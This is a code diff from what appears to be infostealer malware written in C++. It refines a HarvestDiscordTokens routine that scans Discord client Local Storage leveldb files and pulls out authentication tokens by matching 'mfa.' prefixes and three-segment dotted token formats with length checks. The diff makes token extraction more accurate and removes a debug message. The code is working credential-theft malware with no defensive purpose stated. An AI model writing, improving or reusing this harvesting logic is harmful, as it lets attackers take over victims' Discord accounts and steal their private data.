@@ -1081,15 +1081,6 @@ static bool IsTokenChar(char c) {
     return isalnum((unsigned char)c) || c == '_' || c == '-' || c == '.';
 }
 
-static bool IsLikelyToken(const std::string& s) {
-    if (s.size() < 50 || s.size() > 120) return false;
-    int dots = 0;
-    for (size_t i = 0; i < s.size(); i++) if (s[i] == '.') dots++;
-    if (dots != 2 && s.find("mfa.") != 0) return false;
-    for (size_t i = 0; i < s.size(); i++) if (!IsTokenChar(s[i])) return false;
-    return true;
-}
-
 static void HarvestDiscordTokens() {
     const char* variantPaths[] = {
         "\\discord\\Local Storage\\leveldb",
@@ -1139,15 +1130,31 @@ static void HarvestDiscordTokens() {
             DWORD rd = 0;
             if (ReadFile(hFile, buf, sz, &rd, NULL) && rd == sz) {
                 buf[sz] = 0;
-                std::string accum;
                 for (DWORD i = 0; i < sz; i++) {
-                    if (IsTokenChar(buf[i])) {
-                        accum += buf[i];
-                    } else {
-                        if (!accum.empty()) { totalCandidates++; if (IsLikelyToken(accum)) { tokens.push_back(accum); } accum.clear(); }
+                    if (!IsTokenChar(buf[i])) continue;
+                    // MFA token: starts with "mfa."
+                    if (i + 4 <= sz && buf[i] == 'm' && buf[i+1] == 'f' && buf[i+2] == 'a' && buf[i+3] == '.') {
+                        DWORD j = i + 4; while (j < sz && IsTokenChar(buf[j]) && j - i < 120) j++;
+                        if (j - i >= 70 && j - i <= 120) { totalCandidates++; tokens.push_back(std::string(buf + i, j - i)); }
+                        i = j; continue;
                     }
+                    // Standard token: find 2 dots with segment lengths matching discord format
+                    DWORD dots = 0, dp[2] = {0}, end = i;
+                    while (end < sz && IsTokenChar(buf[end]) && end - i < 130) {
+                        if (buf[end] == '.') { if (dots < 2) dp[dots++] = end; else break; }
+                        end++;
+                    }
+                    if (dots == 2) {
+                        DWORD seg1 = dp[0] - i, seg2 = dp[1] - dp[0] - 1;
+                        while (end < sz && IsTokenChar(buf[end]) && end - i < 130) end++;
+                        DWORD seg3 = end - dp[1] - 1;
+                        if (seg1 >= 15 && seg1 <= 35 && seg2 >= 4 && seg2 <= 12 && seg3 >= 20 && seg3 <= 60) {
+                            totalCandidates++; tokens.push_back(std::string(buf + i, end - i));
+                        }
+                    }
+                    // Skip past this run of token chars
+                    while (i < sz && IsTokenChar(buf[i])) i++;
                 }
-                if (!accum.empty()) { totalCandidates++; if (IsLikelyToken(accum)) tokens.push_back(accum); }
             }
             delete[] buf;
             CloseHandle(hFile);
@@ -1159,10 +1166,6 @@ static void HarvestDiscordTokens() {
     } // outer baseTry loop
 
     LogMsg(std::string("Discord: ") + std::to_string(totalFilesScanned) + " total files, " + std::to_string(totalCandidates) + " candidates, " + std::to_string(tokens.size()) + " valid tokens");
-    if (totalCandidates > 0 && tokens.empty()) {
-        // Log a sample candidate to debug the token format
-        LogMsg("Discord: no tokens matched format, checking raw scan");
-    }
 
     if (!tokens.empty()) {
         std::sort(tokens.begin(), tokens.end());
